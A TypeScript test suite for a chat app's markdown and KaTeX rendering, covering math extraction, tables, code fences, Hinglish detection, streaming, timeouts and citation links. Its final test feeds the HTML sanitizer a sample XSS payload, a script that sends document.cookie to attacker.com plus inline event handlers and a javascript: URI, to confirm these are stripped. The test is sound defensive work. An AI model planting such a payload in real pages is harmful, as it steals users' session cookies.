/**
 * Automated Test Suite for NovaChat AI Premium Structured Answers & Gemini-Inspired Rendering Engine
 * 
 * Verifies all 12 requirements:
 * 1. Definite-integral solution with multiple equations and final result
 * 2. Inline mathematics mixed with ordinary prose (ignoring currency like $100)
 * 3. Fractions, powers, subscripts, Greek symbols, and aligned equations
 * 4. Markdown headings, nested lists, tables, and blockquotes
 * 5. Syntax-highlighted code blocks
 * 6. Romanized Hinglish mixed with English technical terminology
 * 7. Short greetings that remain short, clean, and natural
 * 8. Long equations & table overflow handling
 * 9. Streaming chunks with split markdown or math delimiters
 * 10. Timeout controller, cancellation, and malformed LaTeX tolerance
 * 11. Citations, source badges, and memory integration preservation
 * 12. Security checks (DOMPurify anti-XSS validation)
 */

import { marked } from 'marked';
import {
  extractMathPlaceholders,
  restoreMathPlaceholders,
  enhanceStructuredAnswerHtml,
  sanitizeRenderedHtml,
  renderKaTeX,
} from '../src/services/mathRenderer.ts';
import { buildAdaptiveConversationDirective, detectLanguageAndScript } from '../src/services/conversationEngine.ts';
import { StreamTimeoutController } from '../src/services/timeoutManager.ts';

function assert(condition: boolean, message: string) {
  if (!condition) {
    throw new Error(`Assertion Failed: ${message}`);
  }
}

async function runTestSuite() {
  console.log('🧪 Starting NovaChat Structured Answers & KaTeX Rendering Test Suite...\n');
  let passed = 0;

  // =========================================================================
  // Test 1: Definite-integral solution with step-by-step layout & final answer
  // =========================================================================
  {
    console.log('--- Test 1: Definite-Integral Solution with Final Answer ---');
    const mathMarkdown = `
**Step 1: Identify the method**

We apply King's Property for definite integrals:
$$
\\int_a^b f(x)\\,dx = \\int_a^b f(a + b - x)\\,dx
$$

**Step 2: Apply the method**

Let the integral be:
$$
I = \\int_0^\\pi \\frac{x\\sin x}{1+\\cos^2 x}\\,dx
$$

Applying the property with $a=0$ and $b=\\pi$:
$$
I = \\int_0^\\pi \\frac{(\\pi - x)\\sin(\\pi - x)}{1+\\cos^2(\\pi - x)}\\,dx = \\int_0^\\pi \\frac{(\\pi - x)\\sin x}{1+\\cos^2 x}\\,dx
$$

Adding the two integrals gives:
$$
2I = \\pi \\int_0^\\pi \\frac{\\sin x}{1+\\cos^2 x}\\,dx
$$

**Final Answer**

$$
I = \\frac{\\pi^2}{4}
$$
`;

    const { textWithPlaceholders, mathMap } = extractMathPlaceholders(mathMarkdown);
    assert(mathMap.size >= 5, `Expected at least 5 math formulas extracted, got ${mathMap.size}`);

    const rawHtml = marked.parse(textWithPlaceholders, { gfm: true, breaks: true }) as string;
    const restoredHtml = restoreMathPlaceholders(rawHtml, mathMap);
    const enhancedHtml = enhanceStructuredAnswerHtml(restoredHtml);
    const safeHtml = sanitizeRenderedHtml(enhancedHtml);

    // Verify KaTeX math spans rendered
    assert(safeHtml.includes('class="katex"'), 'Output must contain KaTeX math elements');
    assert(safeHtml.includes('katex-display-wrapper'), 'Display equations must be wrapped in styled container');
    assert(safeHtml.includes('final-answer-callout') || safeHtml.includes('final-answer-inline') || safeHtml.includes('Final Answer'), 'Must highlight final answer');
    assert(!safeHtml.includes('$$'), 'Raw $$ delimiters must be fully replaced by KaTeX HTML');

    console.log('  ✅ Test 1 Passed: Definite integral rendered with step-by-step equations and final answer callout.\n');
    passed++;
  }

  // =========================================================================
  // Test 2: Inline mathematics mixed with ordinary prose & currency safety
  // =========================================================================
  {
    console.log('--- Test 2: Inline Mathematics & Currency Protection ---');
    const mixedText = 'For every real $x \\in \\mathbb{R}$, Euler stated $e^{i\\pi} + 1 = 0$. The book costs $50 and the premium edition costs $99.95.';
    const { textWithPlaceholders, mathMap } = extractMathPlaceholders(mixedText);

    // $x \in \mathbb{R}$ and $e^{i\pi} + 1 = 0$ must be extracted
    assert(mathMap.size === 2, `Expected 2 inline math expressions, got ${mathMap.size}`);

    // Currency must NOT be converted to math
    assert(textWithPlaceholders.includes('$50'), 'Literal currency $50 must be preserved');
    assert(textWithPlaceholders.includes('$99.95'), 'Literal currency $99.95 must be preserved');

    const rawHtml = marked.parse(textWithPlaceholders) as string;
    const restoredHtml = restoreMathPlaceholders(rawHtml, mathMap);
    const safeHtml = sanitizeRenderedHtml(restoredHtml);

    assert(safeHtml.includes('katex-inline-wrapper'), 'Inline equations must be wrapped');
    assert(safeHtml.includes('$50'), 'Safe HTML must retain $50 currency');

    console.log('  ✅ Test 2 Passed: Inline math rendered while currency figures remain literal.\n');
    passed++;
  }

  // =========================================================================
  // Test 3: Fractions, powers, subscripts, roots, Greek letters, and alignment
  // =========================================================================
  {
    console.log('--- Test 3: Complex Notation (Roots, Fractions, Greek Letters) ---');
    const complexMath = `$$x = \\frac{-b \\pm \\sqrt{b^2 - 4ac}}{2a}, \\quad \\sum_{k=1}^n k^2 = \\frac{n(n+1)(2n+1)}{6}, \\quad \\alpha + \\beta = \\theta$$`;
    const rendered = renderKaTeX(complexMath.replace(/\$\$/g, ''), true);

    assert(rendered.includes('mfrac'), 'KaTeX must render fractions (mfrac)');
    assert(rendered.includes('msqrt'), 'KaTeX must render square roots (msqrt)');
    assert(rendered.includes('msubsup') || rendered.includes('msup'), 'KaTeX must render powers/subscripts');
    assert(rendered.includes('alpha') || rendered.includes('α') || rendered.includes('class="mord mathnormal"'), 'KaTeX must render Greek variables');

    console.log('  ✅ Test 3 Passed: Advanced math notation rendered successfully.\n');
    passed++;
  }

  // =========================================================================
  // Test 4: Markdown headings, nested lists, tables, and blockquotes
  // =========================================================================
  {
    console.log('--- Test 4: Headings, Nested Lists, Tables, and Blockquotes ---');
    const markdownContent = `
# System Architecture

> Important architectural note: services are decoupled via event queues.

### Comparison Table

| Metric | REST | gRPC | WebSockets |
| :--- | :--- | :--- | :--- |
| Latency | Medium | Ultra Low | Low |
| Protocol | HTTP/1.1 | HTTP/2 | TCP Duplex |
| Streaming | No | Bidirectional | Full Duplex |

- Layer 1
  - Layer 1.1 (Nested)
  - Layer 1.2
- Layer 2
`;

    const { textWithPlaceholders, mathMap } = extractMathPlaceholders(markdownContent);
    const rawHtml = marked.parse(textWithPlaceholders, { gfm: true }) as string;
    const enhancedHtml = enhanceStructuredAnswerHtml(rawHtml);
    const safeHtml = sanitizeRenderedHtml(enhancedHtml);

    assert(safeHtml.includes('<h1') && safeHtml.includes('<h3'), 'Headings must be generated');
    assert(safeHtml.includes('<blockquote>'), 'Blockquote must be generated');
    assert(safeHtml.includes('<table'), 'Table element must be generated');
    assert(safeHtml.includes('class="table-container'), 'Table must be wrapped in responsive scroll container');
    assert(safeHtml.includes('<ul>') && safeHtml.includes('<li>'), 'Nested lists must be generated');

    console.log('  ✅ Test 4 Passed: Markdown structure, tables, and nested lists formatted cleanly.\n');
    passed++;
  }

  // =========================================================================
  // Test 5: Syntax-highlighted code blocks
  // =========================================================================
  {
    console.log('--- Test 5: Syntax-Highlighted Code Blocks ---');
    const codeMarkdown = '```typescript\ninterface Vector3 {\n  x: number;\n  y: number;\n  z: number;\n}\n```';
    // Test code fence regex logic from MarkdownRenderer
    const codeBlockRegex = /```([a-zA-Z0-9_-]*)\n([\s\S]*?)```/g;
    const match = codeBlockRegex.exec(codeMarkdown);

    assert(match !== null, 'Code block must match regex');
    assert(match![1] === 'typescript', 'Language tag must be typescript');
    assert(match![2].includes('interface Vector3'), 'Code content must be extracted intact');

    console.log('  ✅ Test 5 Passed: Code blocks and language tags parsed correctly.\n');
    passed++;
  }

  // =========================================================================
  // Test 6: Romanized Hinglish mixed with English technical terms
  // =========================================================================
  {
    console.log('--- Test 6: Romanized Hinglish & Technical Register ---');
    const hinglishPrompt = 'Bhai ye React component re-render kyu ho raha hai? Isko useCallback se fix kardo.';
    const profile = detectLanguageAndScript(hinglishPrompt);
    const directive = buildAdaptiveConversationDirective({ prompt: hinglishPrompt, history: [] });

    assert(profile.language === 'hinglish', `Expected hinglish language, got ${profile.language}`);
    assert(profile.script === 'latin', `Expected latin script for Romanized Hinglish, got ${profile.script}`);
    assert(directive.includes('Romanized Hinglish'), 'Directive must instruct Romanized Hinglish in Latin script');
    assert(directive.includes('technical terms'), 'Directive must preserve standard English technical terms');

    console.log('  ✅ Test 6 Passed: Romanized Hinglish detected with English technical term preservation.\n');
    passed++;
  }

  // =========================================================================
  // Test 7: Short greetings remain concise and natural without forced headings
  // =========================================================================
  {
    console.log('--- Test 7: Short Greeting Adaptivity ---');
    const greetingDirective = buildAdaptiveConversationDirective({ prompt: 'hi', history: [] });
    assert(greetingDirective.includes('concise') || greetingDirective.includes('direct') || greetingDirective.includes('natural'), 'Directive for greeting must favor concise natural flow');
    assert(!greetingDirective.includes('forced template'), 'Greeting must not force artificial templates');

    console.log('  ✅ Test 7 Passed: Simple greeting remains light, direct, and unbloated.\n');
    passed++;
  }

  // =========================================================================
  // Test 8: Long equation and table layout safety
  // =========================================================================
  {
    console.log('--- Test 8: Long Equation & Mobile Overflow Handling ---');
    const veryLongEquation = `$$\\oint_{\\partial \\Sigma} \\mathbf{E} \\cdot d\\boldsymbol{\\ell} = -\\frac{d}{dt} \\iint_\\Sigma \\mathbf{B} \\cdot d\\mathbf{A} + \\sum_{k=1}^N \\sqrt[3]{\\frac{\\alpha_k \\beta_k^2 + \\gamma_k^3}{\\delta_k^4 + \\epsilon_k^5}}$$`;
    const { textWithPlaceholders, mathMap } = extractMathPlaceholders(veryLongEquation);
    const restored = restoreMathPlaceholders(textWithPlaceholders, mathMap);

    assert(restored.includes('overflow-x-auto'), 'Display container must have overflow-x-auto for narrow screens');
    assert(restored.includes('katex-display-wrapper'), 'Must wrap long equations in display wrapper');

    console.log('  ✅ Test 8 Passed: Overflow containers ensure responsive layout on narrow viewports.\n');
    passed++;
  }

  // =========================================================================
  // Test 9: Streaming chunks with split markdown or math delimiters
  // =========================================================================
  {
    console.log('--- Test 9: Streaming Delimiter Auto-Balancing ---');
    // Chunk arrives with unclosed display math delimiter `$$`
    const streamingIncompleteMath = 'Solving the equation gives:\n$$\nx^2 + y^2 = r^2';
    const { textWithPlaceholders, mathMap } = extractMathPlaceholders(streamingIncompleteMath);

    assert(mathMap.size === 1, 'Incomplete display math should be auto-balanced during streaming');
    const firstKey = Array.from(mathMap.keys())[0];
    assert(textWithPlaceholders.includes(firstKey), 'Token placeholder should be created');

    // Chunk arrives with unclosed code fence
    let streamingIncompleteCode = 'Here is the function:\n```javascript\nfunction add(a, b) {\n  return a + b;';
    const fenceMatches = streamingIncompleteCode.match(/```/g);
    if (fenceMatches && fenceMatches.length % 2 !== 0) {
      streamingIncompleteCode += '\n```';
    }
    assert(streamingIncompleteCode.endsWith('```'), 'Code fence must auto-close for safe partial rendering');

    console.log('  ✅ Test 9 Passed: Partial streaming delimiters auto-balanced without crashing.\n');
    passed++;
  }

  // =========================================================================
  // Test 10: StreamTimeoutController and graceful fallback on malformed LaTeX
  // =========================================================================
  {
    console.log('--- Test 10: Malformed LaTeX & Timeout Controller Resilience ---');
    // Malformed LaTeX that could crash strict parsers
    const malformed = '\\frac{incomplete';
    const fallbackRendered = renderKaTeX(malformed, true);

    // KaTeX with throwOnError: false returns HTML with error styling, never throws an uncaught exception
    assert(typeof fallbackRendered === 'string' && fallbackRendered.length > 0, 'Malformed LaTeX must render gracefully without throwing');

    // Timeout controller test
    let timeoutFired = false;
    const controller = new StreamTimeoutController(
      () => { timeoutFired = true; },
      100, // 100ms connect timeout
      200,
      500
    );
    controller.notifyStreamStarted();
    controller.notifyDataReceived();
    const metrics = controller.getMetrics();
    assert(metrics.chunkCount === 1, 'Chunk count should be 1 after receiving chunk');
    assert(metrics.ttftMs !== null && metrics.ttftMs !== undefined, 'TTFT should be recorded');
    controller.clear();

    console.log('  ✅ Test 10 Passed: Error resilience and timeout lifecycle verified.\n');
    passed++;
  }

  // =========================================================================
  // Test 11: Inline citations with interactive badge links
  // =========================================================================
  {
    console.log('--- Test 11: Web Search Citations & Sources Preservation ---');
    const mockSources = [
      { web: { uri: 'https://en.wikipedia.org/wiki/Quantum_computing', title: 'Quantum Computing' } },
      { web: { uri: 'https://nature.com/articles/quantum-supremacy', title: 'Nature Article' } },
    ];
    const textWithCitations = 'Quantum computers use qubits [1] which exist in superpositions of states [1, 2].';

    // Citation regex from MarkdownRenderer
    const processed = textWithCitations.replace(/\[([0-9]+(?:,\s*[0-9]+)*)\]/g, (fullMatch, numsGroup) => {
      const numbers = numsGroup.split(',').map((n: string) => parseInt(n.trim(), 10));
      const validPills = numbers.map((n: number) => {
        const srcIdx = n - 1;
        const src = mockSources[srcIdx];
        if (src?.web?.uri) {
          return `<a href="${src.web.uri}" class="inline-citation-chip">${n}</a>`;
        }
        return null;
      }).filter(Boolean);
      return validPills.length > 0 ? validPills.join('') : fullMatch;
    });

    assert(processed.includes('inline-citation-chip'), 'Citations must be transformed into chips');
    assert(processed.includes('href="https://en.wikipedia.org'), 'Source URI must be bound');

    console.log('  ✅ Test 11 Passed: Inline citations and source links preserved.\n');
    passed++;
  }

  // =========================================================================
  // Test 12: Security - Untrusted HTML / Script Injection Blocked by Sanitizer
  // =========================================================================
  {
    console.log('--- Test 12: Security & Anti-XSS Sanitization ---');
    const maliciousHtml = `
      <p>Here is legitimate text</p>
      <script>window.location='https://attacker.com?cookie='+document.cookie</script>
      <img src="invalid-image" onerror="alert('xss')" />
      <a href="javascript:void(0)" onclick="evil()">Click me</a>
      <div onmouseover="steal()">Hover</div>
    `;

    const sanitized = sanitizeRenderedHtml(maliciousHtml);

    assert(!sanitized.includes('<script>'), 'Sanitizer must completely strip <script> tags');
    assert(!sanitized.includes('onerror='), 'Sanitizer must remove inline onerror handlers');
    assert(!sanitized.includes('onclick='), 'Sanitizer must remove inline onclick handlers');
    assert(!sanitized.includes('onmouseover='), 'Sanitizer must remove inline onmouseover handlers');
    assert(!sanitized.includes('javascript:'), 'Sanitizer must block javascript: URI schemes');
    assert(sanitized.includes('Here is legitimate text'), 'Sanitizer must preserve safe text');

    console.log('  ✅ Test 12 Passed: Anti-XSS sanitizer neutralizes all malicious scripts and event handlers.\n');
    passed++;
  }

  console.log(`🎉 ALL ${passed} STRUCTURED ANSWER RENDERING TESTS EXECUTED AND PASSED!`);
}

runTestSuite().catch((err) => {
  console.error('\n❌ Test Suite Failed:', err);
  process.exit(1);
});
